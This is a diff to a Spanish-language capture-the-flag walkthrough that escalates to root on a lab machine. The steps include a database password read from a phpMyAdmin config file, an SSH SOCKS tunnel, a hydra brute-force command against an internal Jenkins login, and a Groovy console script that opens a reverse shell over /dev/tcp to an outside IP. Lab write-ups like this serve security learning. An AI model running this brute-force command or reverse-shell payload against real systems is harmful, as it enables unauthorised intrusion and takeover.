@@ -86,6 +86,7 @@
         - Encontramos un usuario pero no podemo acceder a su directorio. Seguimos buscando:
         - En /etc/phmyadmin encontramos unas credenciales:
                 -- cat config-db.php
+                
          ````
          <?php
         ##
@@ -101,4 +102,51 @@
         $dbuser='phpmyadmin';
         $dbpass='B2Ud4fEOZmVq';
         ````
-      
+        
+8.  **Accedemos y no se encuentra nada.**
+9. **Tras una larga busqueda de versiones, exploits, etc. Encontramos en el directorio /opt un .txt con credenciales.**
+        
+        - aubreanna:*****
+
+10. **Nos conectamos por SSH y nos encontramos con el archivo jenkins.txt:**
+        
+         Internal Jenkins service is running on 172.17.0.2:8080
+
+11. **Creamos un proxy socks para ver que nos encontramos**
+        . ssh -D "10101" -q -N -f aubreanna@10.10.17.84
+        . Configuramos el proxy en firefox y nos conectamos.
+        . Nos encontramos un login de jenkins.
+        
+12. **Realizamos un ataque de fuerza bruta contra el servicio**
+
+        - proxychains hydra 172.17.0.2 -s 8080 -V -f http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or >
+        
+        - Contraseña encontrada:
+       [proxychains] Strict chain  ...  127.0.0.1:10101  ...  172.17.0.2:8080 [proxychains] Strict chain  ...  127.0.0.1:10101  ...  172.17.0.2:8080 [8080]            [http-post-form] host: 172.17.0.2
+       login: admin   password: *******
+       [STATUS] attack finished for 172.17.0.2 (valid pair found)
+       1 of 1 target successfully completed, 1 valid password found
+
+13. **Creamos una reverse shell en jenkins.**
+
+        - Manage --> Script console
+        - Groovy script:
+     
+````
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.17.84/5555;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+````
+
+
+14. **Tenemos una shell como usuario jenkins.**
+
+        - En el directorio /opt --> note.txt
+        - root:*******
+
+15. **Accedemos por ssh**
+
+        - root.txt
+        - Obtenemos la flag: ***********
+
+
